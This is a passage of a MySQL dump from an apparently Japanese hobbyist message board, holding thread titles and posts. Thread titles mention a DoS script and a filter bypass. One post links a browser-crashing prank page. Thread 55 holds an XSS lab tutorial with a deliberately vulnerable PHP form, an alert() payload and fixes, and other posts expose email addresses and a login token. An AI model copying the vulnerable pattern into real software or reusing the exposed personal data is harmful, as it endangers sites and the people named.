(66, '自作dos攻撃スクリプト(自動でip偽造)', '2024-12-12 08:50:12', NULL, 'a', '自作dos攻撃スクリプト(自動でip偽造)', NULL),
(67, 'スレ主と表示されるかテスト', '2024-12-15 03:27:50', NULL, 'v', 'テスト', NULL),
(68, 'フィルタ解除方法', '2024-12-18 10:26:34', NULL, 'zi', '', NULL),
(69, 'qq', '2024-12-19 06:17:47', NULL, 's', '', NULL),
(70, 'ざつだん', '2024-12-19 06:19:39', NULL, 's', '', NULL),
(71, 'https://www.youtube.com/results?search_query=%E3%83%95%E3%82%A9%E3%83%BC%E3%83%88%E3%83%8A%E3%82%A4%E3%83%88', '2024-12-20 06:15:36', NULL, 'l', '', NULL),
(72, 'https://www.youtube.com/results?search_query=%E3%83%95%E3%82%A9%E3%83%BC%E3%83%88%E3%83%8A%E3%82%A4%E3%83%88', '2024-12-20 06:15:36', NULL, 'l', '', NULL),
(73, 'http://www.fortnite.com/?lang=ja', '2024-12-20 06:16:45', NULL, 'l', '', NULL),
(74, 'https://if62-r.digitalartscloud.com/rating?blkinfo=84/DUPHrcPwtOy8/rvc6NDJgya9d/0Kz4PUqwVWwCTKyQWF1bH1GlYIM3ilaEKNPzD41Ls8LNfk2+2HDeAhRzl8lmGZU/3s01muyM+IgNUCOErhpGJScOGDpIpN4xmG7uyicdUPuiCxwUHOFCbC6VFUFEOZpPqObPuB3F2Z5eqUy2y/H7bH1dN0uxRbD/puesNlj6m3/s8IR', '2024-12-23 00:03:09', NULL, 'l', '', NULL),
(75, 'フォートナイト', '2024-12-23 00:04:26', NULL, 'l', '', NULL),
(76, 'poolskechみたいなサイト作ってみた', '2025-01-29 11:06:43', NULL, 'v', '', NULL),
(77, 'oioi', '2025-02-13 10:22:54', NULL, 'm4', '', NULL);

-- --------------------------------------------------------

--
-- テーブルの構造 `thread_posts`
--

CREATE TABLE IF NOT EXISTS `thread_posts` (
  `id` int(11) NOT NULL,
  `thread_id` int(11) NOT NULL,
  `name` varchar(100) DEFAULT 'Anonymous',
  `message` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `user_id` int(11) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=124 DEFAULT CHARSET=utf8;

--
-- テーブルのデータのダンプ `thread_posts`
--

INSERT INTO `thread_posts` (`id`, `thread_id`, `name`, `message`, `created_at`, `user_id`) VALUES
(4, 3, 'Anonymous', 'http://gt2c76lwos5etnv4fue5pqgmkutwf5dghcgr5wbakijl55u2vfuvdrad.onion/chat', '2024-11-22 10:16:30', NULL),
(12, 3, 'Anonymous', 'ラグい？', '2024-11-22 12:24:13', NULL),
(13, 3, 'Anonymous', '知らん', '2024-11-22 12:24:21', NULL),
(79, 40, 'Anonymous', 'テスト', '2024-11-24 00:57:47', NULL),
(80, 40, '名無し', 'あ', '2025-11-24 00:57:58', NULL),
(81, 40, 'Anonymous', 'レス数をつけた', '2024-11-24 00:58:10', NULL),
(82, 41, 'Anonymous', '名前：Flick\r\nURL：http://flick.starfree.jp/', '2024-11-24 09:49:51', NULL),
(83, 41, 'Anonymous', 'reCAPTCHAつけた', '2024-11-24 10:03:20', NULL),
(84, 41, 'Anonymous', 'アイコン\r\n<img src="http://flick.starfree.jp/uploads/images/Flick.jpg" alt="投稿画像"/>', '2024-11-25 12:17:43', NULL),
(85, 41, 'Anonymous', 'http://flick.starfree.jp/uploads/images/Flick.jpg', '2024-11-25 12:17:56', NULL),
(86, 41, 'Anonymous', '画像アップできるようにした\r\n', '2024-11-26 06:58:52', NULL),
(89, 43, 'Anonymous', 'https://www.noip.com/', '2024-11-27 06:44:43', NULL),
(90, 43, 'Anonymous', '<a href="https://www.noip.com">アンカーテキスト</a>\r\n', '2024-11-27 06:52:01', NULL),
(91, 43, 'Anonymous', '<a href="https://www.noip.com">アンカーテキスト</a>', '2024-11-27 06:53:33', NULL),
(92, 43, 'Anonymous', ' nansadfmnad fmfd smf fmskf mfiasod  msokdf  di diosmf iosd fdsjf id jgiodj kfajsf jidjf idsjfksaj difjisdjfdvjnn jno okv osjgoi gv nkfn knk ngfn fn fk vk kd vjdfio div jdimv madmf dfj dsfvoi bifvjkofdvioadf this th e dkjfioadfaiow iefjio adfiasdif esd faiof ewiof dsfudkjaei odjfk d ff jfvj dvdf feai9 9idjf iji d ifijdj akdjvasiojis joidsfio asiodjfi saudhfuhduf d fiasjid faj fjiasjdfi jaifjd.', '2024-11-27 06:55:16', NULL),
(93, 43, 'Anonymous', 'https://www.value-domain.com/media/free-domain/', '2024-11-27 07:03:49', NULL),
(94, 43, 'Anonymous', 'https://a147-240d-1a-da7-ee00-802a-9624-45ae-a00e.ngrok-free.app/dashboard/', '2024-11-27 07:48:19', NULL),
(95, 44, 'Anonymous', 'https://s3.ap-northeast-1-ntt.wasabisys.com/ak1520d-filenow-12/files/20241129-1729_9060a296489cf607753a40fe674353f3.zip', '2024-11-29 08:57:03', NULL),
(96, 44, 'Anonymous', 'javascript:(function() {\r\n  const downloadLink = document.querySelector(''a.btn.btn-warning.btn-full[onclick^="downloadDirect"]'');\r\n\r\n  if (downloadLink) {\r\n    const match = downloadLink.getAttribute("onclick").match(/https[^"]+/);\r\n    const fileUrl = match ? match[0] : null;\r\n\r\n    if (fileUrl) {\r\n      navigator.clipboard.writeText(fileUrl).then(() => {\r\n        alert("URLがコピーされました: " + fileUrl);\r\n      }).catch(err => {\r\n        alert("コピーに失敗しました: " + err);\r\n      });\r\n    } else {\r\n      alert("URLが見つかりませんでした。");\r\n    }\r\n  } else {\r\n    alert("ダウンロードリンクが見つかりません。");\r\n  }\r\n})();\r\n', '2024-11-29 09:02:55', NULL),
(97, 45, 'Anonymous', 'https://dostesuto.github.io/You-are-an-idiot/', '2024-11-29 09:13:57', NULL),
(98, 45, 'Anonymous', 'ブラウザクラッシャーw', '2024-11-29 09:45:20', NULL),
(99, 46, 'Anonymous', 'https://www.youtube.com/watch?v=fWur7NnLz-g', '2024-11-29 22:54:59', NULL),
(100, 47, 'Anonymous', 'https://3d56-240d-1a-da7-ee00-9435-102d-5975-7991.ngrok-free.app/', '2024-11-30 06:04:24', NULL),
(102, 47, 'Anonymous', 'https://448e-240d-1a-da7-ee00-4057-d427-a27a-72ba.ngrok-free.app', '2024-12-01 02:10:56', NULL),
(103, 49, 'Anonymous', 'https://c.kuku.lu/vaszpn5u', '2024-12-01 02:27:05', NULL),
(104, 50, 'Anonymous', 'https://login.nvgs.nvidia.com/v1/login/identifier?preferred_nvidia=true&context=Initial&theme=Noir&locale=en-US&prompt=select_account&key=eyJhbGciOiJIUzI1NiJ9.eyJzZSI6Ims5eXAiLCJ0b2tlbklkIjoiMTMxMjY3MzMzNTUzMjU2NDQ4MCIsIm90IjoiMTMxMjY3MzMzNTU1MzUzNjAwMCIsImV4cCI6MTczMzEyMjUxMSwiaWF0IjoxNzMzMDM2MTExLCJqdGkiOiI5MzE2MDFiZi1jY2YwLTRkODUtOTk2Yi02MmM4ZDViODkzYzgifQ.yln6aCx6WWncGl8tngdaLZ6TvSbdXdcY7MgBuMw_e-I&client_id=310670192232366513', '2024-12-01 06:55:39', NULL),
(105, 51, 'Anonymous', '[2024-12-01 17:08:43:892 INFO] ================ TELEMETRY MESSAGE ===================\r\n[2024-12-01 17:08:43:893 INFO] Server Telemetry is currently not enabled.\r\n[2024-12-01 17:08:43:893 INFO] Enabling this telemetry helps us improve the game.\r\n[2024-12-01 17:08:43:893 INFO]\r\n[2024-12-01 17:08:43:893 INFO] To enable this feature, add the line ''emit-server-telemetry=true''\r\n[2024-12-01 17:08:43:894 INFO] to the server.properties file in the handheld/src-server directory\r\n[2024-12-01 17:08:43:894 INFO] ======================================================\r\n[2024-12-01 17:08:44:010 INFO] [Scripting] No script plugins found.', '2024-12-01 08:18:09', NULL),
(106, 51, 'Anonymous', 'server-name=Dedicated Server\r\n# Used as the server name\r\n# Allowed values: Any string without semicolon symbol.\r\n\r\ngamemode=survival\r\n# Sets the game mode for new players.\r\n# Allowed values: "survival", "creative", or "adventure"\r\n\r\nforce-gamemode=false\r\n# force-gamemode=false (or force-gamemode is not defined in the server.properties)\r\n# prevents the server from sending to the client gamemode values other\r\n# than the gamemode value saved by the server during world creation\r\n# even if those values are set in server.properties after world creation.\r\n# \r\n# force-gamemode=true forces the server to send to the client gamemode values\r\n# other than the gamemode value saved by the server during world creation\r\n# if those values are set in server.properties after world creation.\r\n\r\ndifficulty=easy\r\n# Sets the difficulty of the world.\r\n# Allowed values: "peaceful", "easy", "normal", or "hard"\r\n\r\nallow-cheats=false\r\n# If true then cheats like commands can be used.\r\n# Allowed values: "true" or "false"\r\n\r\nmax-players=10\r\n# The maximum number of players that can play on the server.\r\n# Allowed values: Any positive integer\r\n\r\nonline-mode=true\r\n# If true then all connected players must be authenticated to Xbox Live.\r\n# Clients connecting to remote (non-LAN) servers will always require Xbox Live authentication regardless of this setting.\r\n# If the server accepts connections from the Internet, then it''s highly recommended to enable online-mode.\r\n# Allowed values: "true" or "false"\r\n\r\nallow-list=false\r\n# If true then all connected players must be listed in the separate allowlist.json file.\r\n# Allowed values: "true" or "false"\r\n\r\nserver-port=19132\r\n# Which IPv4 port the server should listen to.\r\n# Allowed values: Integers in the range [1, 65535]\r\n\r\nserver-portv6=19133\r\n# Which IPv6 port the server should listen to.\r\n# Allowed values: Integers in the range [1, 65535]\r\n\r\nenable-lan-visibility=true\r\n# Listen and respond to clients that are looking for servers on the LAN. This will cause the server\r\n# to bind to the default ports (19132, 19133) even when `server-port` and `server-portv6`\r\n# have non-default values. Consider turning this off if LAN discovery is not desirable, or when\r\n# running multiple servers on the same host may lead to port conflicts.\r\n# Allowed values: "true" or "false"\r\n\r\nview-distance=32\r\n# The maximum allowed view distance in number of chunks.\r\n# Allowed values: Positive integer equal to 5 or greater.\r\n\r\ntick-distance=4\r\n# The world will be ticked this many chunks away from any player.\r\n# Allowed values: Integers in the range [4, 12]\r\n\r\nplayer-idle-timeout=30\r\n# After a player has idled for this many minutes they will be kicked. If set to 0 then players can idle indefinitely.\r\n# Allowed values: Any non-negative integer.\r\n\r\nmax-threads=8\r\n# Maximum number of threads the server will try to use. If set to 0 or removed then it will use as many as possible.\r\n# Allowed values: Any positive integer.\r\n\r\nlevel-name=Bedrock level\r\n# Allowed values: Any string without semicolon symbol or symbols illegal for file name: /\\n\\r\\t\\f`?*\\\\<>|\\":\r\n\r\nlevel-seed=\r\n# Use to randomize the world\r\n# Allowed values: Any string\r\n\r\ndefault-player-permission-level=member\r\n# Permission level for new players joining for the first time.\r\n# Allowed values: "visitor", "member", "operator"\r\n\r\ntexturepack-required=false\r\n# Force clients to use texture packs in the current world\r\n# Allowed values: "true" or "false"\r\n\r\ncontent-log-file-enabled=false\r\n# Enables logging content errors to a file\r\n# Allowed values: "true" or "false"\r\n\r\ncompression-threshold=1\r\n# Determines the smallest size of raw network payload to compress\r\n# Allowed values: 0-65535\r\n\r\ncompression-algorithm=zlib\r\n# Determines the compression algorithm to use for networking\r\n# Allowed values: "zlib", "snappy"\r\n\r\nserver-authoritative-movement=server-auth\r\n# Allowed values: "client-auth", "server-auth", "server-auth-with-rewind"\r\n# Changes the server authority on movement:\r\n# "client-auth": Server has no authority and accepts all positions from the client.\r\n# "server-auth": Server takes user input and simulates the Player movement but accepts the Client version if there is disagreement.\r\n# "server-auth-with-rewind": The server will replay local user input and will push it to the Client so it can correct the position if it does not match.\r\n# 		The clients will rewind time back to the correction time, apply the correction, then replay all the player''s inputs since then. This results in smoother and more frequent corrections.\r\nplayer-position-acceptance-threshold=0.5\r\n# Only used with "server-auth-with-rewind".\r\n# This is the tolerance of discrepancies between the Client and Server Player position. This helps prevent sending corrections too frequently\r\n# for non-cheating players in cases where the server and client have different perceptions about when a motion started. For example damage knockback or being pushed by pistons.\r\n# The higher the number, the more tolerant the server will be before asking for a correction. Values beyond 1.0 have increased chances of allowing cheating.\r\n\r\nplayer-movement-action-direction-threshold=0.85\r\n# The amount that the player''s attack direction and look direction can differ.\r\n# Allowed values: Any value in the range of [0, 1] where 1 means that the\r\n# direction of the players view and the direction the player is attacking\r\n# must match exactly and a value of 0 means that the two directions can\r\n# differ by up to and including 90 degrees.\r\n\r\nserver-authoritative-block-breaking-pick-range-scalar=1.5\r\n# If true, the server will compute block mining operations in sync with the client so it can verify that the client should be able to break blocks when it thinks it can.\r\n\r\nchat-restriction=None\r\n# Allowed values: "None", "Dropped", "Disabled"\r\n# This represents the level of restriction applied to the chat for each player that joins the server.\r\n# "None" is the default and represents regular free chat.\r\n# "Dropped" means the chat messages are dropped and never sent to any client. Players receive a message to let them know the feature is disabled.\r\n# "Disabled" means that unless the player is an operator, the chat UI does not even appear. No information is displayed to the player.\r\n\r\ndisable-player-interaction=false\r\n# If true, the server will inform clients that they should ignore other players when interacting with the world. This is not server authoritative.\r\n\r\nclient-side-chunk-generation-enabled=true\r\n# If true, the server will inform clients that they have the ability to generate visual level chunks outside of player interaction distances.\r\n\r\nblock-network-ids-are-hashes=true\r\n# If true, the server will send hashed block network ID''s instead of id''s that start from 0 and go up.  These id''s are stable and won''t change regardless of other block changes.\r\n\r\ndisable-persona=false\r\n# Internal Use Only\r\n\r\ndisable-custom-skins=false\r\n# If true, disable players customized skins that were customized outside of the Minecraft store assets or in game assets.  This is used to disable possibly offensive custom skins players make.\r\n\r\nserver-build-radius-ratio=Disabled\r\n# Allowed values: "Disabled" or any value in range [0.0, 1.0]\r\n# If "Disabled" the server will dynamically calculate how much of the player''s view it will generate, assigning the rest to the client to build.\r\n# Otherwise from the overridden ratio tell the server how much of the player''s view to generate, disregarding client hardware capability.\r\n# Only valid if client-side-chunk-generation-enabled is enabled\r\n\r\nallow-outbound-script-debugging=false\r\n# Allows script debugger ''connect'' command and script-debugger-auto-attach=connect mode.\r\n\r\nallow-inbound-script-debugging=false\r\n# Allows script debugger ''listen'' command and script-debugger-auto-attach=listen mode.\r\n\r\n#force-inbound-debug-port=19144\r\n# Locks the inbound (listen) debugger port, if not set then default 19144 will be used. Required when using script-debugger-auto-attach=listen mode.\r\n\r\nscript-debugger-auto-attach=disabled\r\n# Attempt to attach script debugger at level load, requires that either inbound port or connect address is set and that inbound or outbound connections are enabled.\r\n# "disabled" will not auto attach.\r\n# "connect" server will attempt to connect to debugger in listening mode on the specified port.\r\n# "listen" server will listen to inbound connect attempts from debugger using connect mode on the specified port.\r\n\r\n#script-debugger-auto-attach-connect-address=localhost:19144\r\n# When auto attach mode is set to ''connect'', use this address in the form host:port. Required for script-debugger-auto-attach=connect mode.\r\n\r\n#script-debugger-auto-attach-timeout=0\r\n# Amount of time to wait at world load for debugger to attach.\r\n\r\n#script-watchdog-enable=true\r\n# Enables the watchdog (default = true).\r\n\r\n#script-watchdog-enable-exception-handling=true\r\n# Enables watchdog exception handling via the events.beforeWatchdogTerminate event (default = true).\r\n\r\n#script-watchdog-enable-shutdown=true\r\n# Enables server shutdown in the case of an unhandled watchdog exception (default = true).\r\n\r\n#script-watchdog-hang-exception=true\r\n# Throws a critical exception when a hang occurs, interrupting script execution (default = true).\r\n\r\n#script-watchdog-hang-threshold=10000\r\n# Sets the watchdog threshold for single tick hangs (default = 10000 ms).\r\n\r\n#script-watchdog-spike-threshold=100\r\n# Sets the watchdog threshold for single tick spikes.\r\n# Warning is disabled if property left unset.\r\n\r\n#script-watchdog-slow-threshold=10\r\n# Sets the wachdog threshold for slow scripts over multiple ticks.\r\n# Warning is disabled if property left unset.\r\n\r\n#script-watchdog-memory-warning=100\r\n# Produces a content log warning when the combined memory usage exceeds the given threshold (in megabytes).\r\n# Setting this value to 0 disables the warning. (default = 100, max = 2000)\r\n\r\n#script-watchdog-memory-limit=250\r\n# Saves and shuts down the world when the combined script memory usage exceeds the given threshold (in megabytes).\r\n# Setting this value to 0 disables the limit. (default = 250, max = 2000)\r\n\r\n\r\n', '2024-12-01 08:22:46', NULL),
(107, 52, 'Anonymous', 'https://www.youtube.com/watch?v=8RoSM79e_b0', '2024-12-02 11:51:16', NULL),
(108, 53, 'Anonymous', 'naisuweb.starfree.jp/tei.mp4', '2024-12-02 11:54:18', NULL),
(109, 52, 'Anonymous', 'https://s3.ap-northeast-1-ntt.wasabisys.com/ak1520d-filenow-10/files/20241202-2056_efa21fa2d6b23dcb56cfdf050235d528.webm', '2024-12-02 11:56:47', NULL),
(110, 54, 'Anonymous', 's1901605@g.sano.ed.jp', '2024-12-03 08:11:45', NULL),
(111, 54, 'Anonymous', 'sabuaka45738@gmail.com', '2024-12-03 10:44:49', NULL),
(112, 55, 'Anonymous', 'xssに付いて調べてるんだけど、\r\nどういうことかまだわからないか、例えば、まず実機(Windows)でphpなんかで脆弱性があるサーバーをlocalhostなかで立ち上げて、Virtualボックスでkalilinuxやubuntuなんかで攻撃テストをしてみたいだんだけど、Virtualボックスはいる？いらない？また攻撃側は一般的になんのosを使っている？', '2024-12-04 06:19:58', NULL),
(113, 55, 'Anonymous', '<html>\r\n<body>\r\n    <form action="xss_test.php" method="POST">\r\n        名前: <input type="text" name="name" />\r\n        <input type="submit" value="送信" />\r\n    </form>\r\n\r\n    <?php\r\n    if (isset($_POST[''name''])) {\r\n        // XSS脆弱性: 入力値をサニタイズせずにそのまま表示\r\n        echo "こんにちは、 " . $_POST[''name''];\r\n    }\r\n    ?>\r\n</body>\r\n</html>\r\n\r\n', '2024-12-04 06:23:08', NULL),
(114, 55, 'Anonymous', '了解しました！具体的にXSS攻撃のテストを行う手順を、ターゲットサーバーの構築から攻撃の実行まで、さらに詳細に説明します。\r\n\r\n目次：\r\nターゲットサーバーの構築（PHPサーバーの設定）\r\n攻撃環境の準備（Kali Linux）\r\nXSS攻撃の実行\r\nXSS攻撃の防御策\r\n1. ターゲットサーバーの構築 (PHPサーバーを立ち上げる)\r\nまず、ターゲットとして攻撃対象になるウェブアプリケーション（脆弱なPHPサイト）を作成します。\r\n\r\n必要なもの：\r\nXAMPP（Apache、MySQL、PHPを含む開発環境）\r\n手順：\r\nXAMPPのインストール\r\n\r\nXAMPPはPHPの実行環境を提供する無料のソフトウェアです。以下の手順でインストールします：\r\nXAMPP公式サイトからXAMPPをダウンロードしてインストール。\r\nインストール後、XAMPPコントロールパネルを開き、Apacheを起動します。\r\nPHPスクリプトの作成 XAMPPがインストールされたら、htdocsフォルダ（通常はC:\\xampp\\htdocs）内に、脆弱なPHPスクリプトを作成します。\r\n\r\n新しいPHPファイルを作成し、xss_test.phpという名前で保存します。\r\n以下のコードをxss_test.phpに入力します。このコードは、入力されたデータをサニタイズせずにそのまま表示するため、XSS攻撃に脆弱です。\r\n\r\nphp\r\nコードをコピーする\r\n<html>\r\n<body>\r\n    <form action="xss_test.php" method="POST">\r\n        名前: <input type="text" name="name" />\r\n        <input type="submit" value="送信" />\r\n    </form>\r\n\r\n    <?php\r\n    if (isset($_POST[''name''])) {\r\n        // XSS脆弱性: 入力値をそのまま表示\r\n        echo "こんにちは、 " . $_POST[''name''];\r\n    }\r\n    ?>\r\n</body>\r\n</html>\r\nこのコードでは、ユーザーから送信された名前をそのまま表示しているため、JavaScriptコードが埋め込まれていた場合、XSS攻撃が成功します。\r\n\r\nサーバーの起動と確認\r\n\r\nXAMPPコントロールパネルで、Apacheが起動していることを確認します。\r\nブラウザを開き、http://localhost/xss_test.php にアクセスして、フォームが表示されるか確認します。\r\n2. 攻撃環境の準備 (Kali Linux)\r\n次に、攻撃環境としてKali Linuxを準備します。Kali Linuxは、ペネトレーションテストのためのツールが豊富にインストールされたLinuxディストリビューションです。\r\n\r\n必要なもの：\r\nKali Linux（仮想マシンでも可）\r\nブラウザ（Chrome、Firefoxなど）\r\n手順：\r\nKali Linuxのインストール\r\n\r\nKali Linuxを公式サイトからダウンロードし、仮想マシン（例：VirtualBox）にインストールするか、実機にインストールします。\r\nターゲットサイトへのアクセス\r\n\r\nKali Linux内のブラウザを開き、ターゲットサーバーにアクセスします。ターゲットサーバーがWindows上のlocalhostで動作している場合、ブラウザで以下のURLにアクセスします：\r\narduino\r\nコードをコピーする\r\nhttp://localhost/xss_test.php\r\n3. XSS攻撃の実行\r\nここで、XSS攻撃を実行します。フォームに悪意のあるJavaScriptコードを入力し、それが実行されるか確認します。\r\n\r\n手順：\r\nフォームにXSSペイロードを入力 ターゲットサーバーのフォーム（http://localhost/xss_test.php）に、以下のような攻撃用スクリプトを入力します：\r\n\r\nhtml\r\nコードをコピーする\r\n<script>alert(''XSS攻撃成功'');</script>\r\nフォームを送信 上記のスクリプトを入力し、「送信」ボタンを押すと、ポップアップが表示されるはずです。\r\n\r\n成功した場合：ブラウザに「XSS攻撃成功」と表示されるアラートが出れば、攻撃が成功したことになります。\r\n失敗した場合：ポップアップが表示されない場合は、ターゲットサイトがXSSに対策されているか、攻撃がうまく注入されていない可能性があります。\r\n4. XSS攻撃の防御策\r\n攻撃が成功した場合、ターゲットサーバーはXSS攻撃に脆弱であることが確認されます。そこで、XSS攻撃を防ぐための対策を講じる必要があります。\r\n\r\n対策1: 入力のサニタイズ\r\nユーザーからの入力値をそのまま表示しないように、HTMLエンティティに変換して表示します。\r\n\r\nPHPでは、htmlspecialchars() 関数を使ってサニタイズすることが推奨されます。\r\n\r\n修正後のコード（xss_test.php）：\r\n\r\nphp\r\nコードをコピーする\r\n<html>\r\n<body>\r\n    <form action="xss_test.php" method="POST">\r\n        名前: <input type="text" name="name" />\r\n        <input type="submit" value="送信" />\r\n    </form>\r\n\r\n    <?php\r\n    if (isset($_POST[''name''])) {\r\n        // サニタイズ: htmlspecialchars() を使ってHTML特殊文字をエスケープ\r\n        echo "こんにちは、 " . htmlspecialchars($_POST[''name'']);\r\n    }\r\n    ?>\r\n</body>\r\n</html>\r\nhtmlspecialchars() 関数は、<、>、" などの特殊文字をHTMLエンティティ（&lt;、&gt;、&quot;）に変換します。これにより、悪意のあるJavaScriptコードは実行されません。\r\n\r\n対策2: Content Security Policy (CSP)\r\n**CSP（コンテンツセキュリティポリシー）**を導入することで、信頼できるスクリプトのみを実行できるよう制限できます。これにより、悪意のあるスクリプトが外部から読み込まれたり、実行されたりするのを防げます。\r\n\r\n例えば、以下のようなCSPヘッダーを設定します：\r\n\r\nphp\r\nコードをコピーする\r\nheader("Content-Security-Policy: default-src ''self''; script-src ''self''");\r\nこの設定により、同一オリジンからのみスクリプトが実行され、外部の不正なスクリプトは実行されません。\r\n\r\nまとめ\r\nターゲットサーバーの作成:\r\n\r\nXAMPPをインストールし、PHPスクリプトを作成して脆弱なフォームを作る。\r\n攻撃環境の準備:\r\n\r\nKali Linuxをインストールし、ターゲットサーバーにアクセス。\r\nXSS攻撃の実行:\r\n\r\n攻撃用のJavaScriptコード（<script>alert(''XSS'');</script>）をフォームに入力して攻撃を試す。\r\n防御策の実施:\r\n\r\n入力をhtmlspecialchars()', '2024-12-04 06:24:19', NULL),
(115, 55, 'Anonymous', 'あなたが挙げた例、https://google.com/<script><alert>("攻撃成功")</alert></script> のような形式でXSS攻撃を試みることは できません。理由としては、主に以下の点が挙げられます：\r\n\r\n1. Googleなどの大手サイトではXSS対策がされている\r\nGoogleをはじめ、主要なウェブサイトやサービスはXSS攻撃に対して強力な防御策を施しています。具体的には、ユーザーからの入力に対するサニタイズや、Content Security Policy（CSP）などを導入して、悪意のあるスクリプトを実行できないようにしています。\r\n\r\n例えば、フォームに入力されたデータをサニタイズして、HTMLタグやJavaScriptを無効化したり、外部スクリプトの実行を制限するCSPを設定したりしています。このような対策により、<script>タグを使ってスクリプトを実行することができません。\r\n\r\n2. URLエンコードが必要\r\nブラウザに直接URLを入力する場合、ブラウザはURLを解釈する際に特定の文字（例：< や >）をHTMLタグとして認識してしまうことを避けるために、これらの文字をエンコードする必要があります。\r\nたとえば、< や > はそれぞれ %3C や %3E にエンコードされます。しかし、URL全体に悪意のあるスクリプトを埋め込んでも、Googleのようなサイトはこれを無害化するためにサニタイズを行うので、実行されません。\r\n3. ブラウザのセキュリティ機能\r\n現代のブラウザは、クロスサイトスクリプティング（XSS）攻撃に対して強力なセキュリティ機能を備えています。例えば、Same-Origin Policy (SOP) や Content Security Policy (CSP) などのセキュリティメカニズムにより、外部のサイトやスクリプトが不正に実行されることを防ぎます。\r\n実際にできるXSS攻撃の形\r\nXSS攻撃を成功させるためには、ターゲットのウェブアプリケーションが以下の条件を満たしている必要があります：\r\n\r\n入力の検証が不十分：サーバーがユーザー入力を適切にサニタイズしていない場合、悪意のあるスクリプトがそのままウェブページに埋め込まれ、実行されてしまうことがあります。\r\n\r\nターゲットがスクリプトを実行する場所がある：たとえば、コメント欄、検索ボックス、URLのパラメータなどにユーザー入力が反映され、その反映部分にスクリプトを埋め込むことができます。\r\n\r\nCSPが適用されていない：CSP（Content Security Policy）が適用されていない、または設定が不十分な場合、悪意のあるスクリプトが外部から読み込まれることが可能になります。\r\n\r\n実際のXSS攻撃の例\r\n例えば、あるウェブサイトに次のようなコメント欄があるとします：\r\n\r\nユーザーがコメントを入力し、その内容がページに表示されます。\r\nサーバー側でコメントに対してサニタイズ処理を行っていない場合、コメント欄に以下のようなスクリプトを入力することで、XSS攻撃が実行される可能性があります。\r\nhtml\r\nコードをコピーする\r\n<script>alert("XSS攻撃成功");</script>\r\nもし、このコメントがそのまま表示されてしまうと、訪問者がそのページを開いたときにアラートが表示されるなどの影響が出ます。\r\n\r\nXSS攻撃の種類\r\nXSSにはいくつかの種類があります。代表的なものを挙げてみましょう：\r\n\r\nStored XSS（保存型XSS）\r\n\r\n悪意のあるスクリプトがウェブサーバーに保存され、他のユーザーがそのページを訪問したときに実行されるタイプのXSSです。\r\n例：掲示板にコメントとしてスクリプトを投稿し、そのコメントを他のユーザーが閲覧した際にスクリプトが実行される。\r\nReflected XSS（反射型XSS）\r\n\r\n悪意のあるスクリプトがURLパラメータやフォーム入力としてウェブサーバーに渡され、そのままレスポンスとして返されるタイプのXSSです。\r\n例：検索フォームに悪意のあるコードを入力し、検索結果ページにそのコードが反映されて実行される。\r\nDOM-based XSS（DOM型XSS）\r\n\r\nサーバー側ではなく、ブラウザのJavaScriptによってXSSが引き起こされる場合です。JavaScriptがクライアントサイドで入力を処理し、その入力に基づいてDOMが変更される際に悪意のあるコードが実行されます。\r\n結論\r\nhttps://google.com/<script><alert>("攻撃成功")</alert></script> のように直接URLにJavaScriptコードを埋め込んでXSS攻撃を仕掛けることはできません。Googleや他の主要なウェブサイトは、XSS攻撃に対して強力な対策を行っているため、悪意のあるスクリプトが実行されることはありません。\r\n\r\nただし、XSS攻撃は、ターゲットウェブサイトが入力サニタイズやCSPを適切に実施していない場合に発生する可能性があるため、脆弱性のあるサイトに対しては攻撃が成立することがあります。\r\n\r\n\r\n\r\n', '2024-12-04 06:28:56', NULL),
(116, 56, 'Anonymous', 'https://www.youtube.com/watch?v=-jfARW9-2rk&t=659s', '2024-12-07 01:46:40', NULL),
(117, 56, 'Anonymous', 'https://youtu.be/-jfARW9-2rk?si=xkD9HpzzqkXN0HWx', '2024-12-07 01:46:55', NULL),
(118, 56, 'Anonymous', '1.(サーバーのダウンロード)https://papermc.io/downloads\r\n2.(Java17のダウンロード)https://www.oracle.com/java/technolog...\r\n3.(Start-up.batの内容)java -Xmx(最大メモリ量)G -Xms(最小メモリ量)G -jar server.jar\r\n4.(GeyserMCのダウンロード)https://ci.opencollab.dev//job/Geyser...\r\n5.(floodgateのダウンロード)https://ci.opencollab.dev//job/Geyser...\r\n6.(UPnPCJのダウンロード)http://umemasu2018.g1.xrea.com/upnpcj/\r\n7.(グローバルipの取得)https://www.ugtop.com/spill.shtml\r\n\r\n00:00 動画の導入\r\n01:00 サーバーの準備\r\n04:50 統合版に対応させる\r\n06:13 接続テストをしよう\r\n09:13 ポート開放をして招待しよう\r\n11:12 ５人で負荷テストをしてみた\r\n\r\n皆さんお久しぶりです、すかいあろーです。今回は初心者向けにJava版にも統合版にも対応しているマイクラの軽量サーバーの導入方法を動画にしてみました。ほぼジャンクなノートPCの使い道に迷っていましたが、マイクラサーバーにするのが最適解なのかもしれません。かなりテンポの速い解説になってしまったので、分からないところがあれば気軽にコメントしていただくとできる限り回答します。\r\n\r\nチャンネル登録/高評価をしてくださるとこれからの動画制作の励みになります～！\r\n\r\nDiscord【OSもどき/ツール研究部！】:  / discord  \r\nTwitter:  / skyarrow_256  \r\n', '2024-12-07 01:49:02', NULL),
(119, 57, 'Anonymous', 'https://kakeru.app/0b965584e0f30bc374ebf77a725633dd\r\n', '2024-12-07 01:58:09', NULL),
(120, 58, 'Anonymous', 'file:///home/chronos/u-d120e95f396f16fbe354ccdd8d5359bc3b416bb1/MyFiles/burauza/dist/app', '2024-12-08 01:54:49', NULL),
(121, 58, 'Anonymous', 'cd /home/chronos/u-d120e95f396f16fbe354ccdd8d5359bc3b416bb1/MyFiles/burauza/dist/\r\n', '2024-12-08 01:55:34', NULL),
(122, 59, 'Anonymous', 'https://www.youtube.com/shorts/VKgjFdo-KEs', '2024-12-08 04:38:04', NULL),
(123, 59, 'Anonymous', 'https://www.youtube.com/watch?v=oswC2Sv4JBA', '2024-12-08 11:23:34', NULL);

-- --------------------------------------------------------

--
-- テーブルの構造 `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `boards`
--
ALTER TABLE `boards`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `slug` (`slug`);

--
-- Indexes for table `id`
--
ALTER TABLE `id`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `news`
--
ALTER TABLE `news`
  ADD PRIMARY KEY (`id`);

--
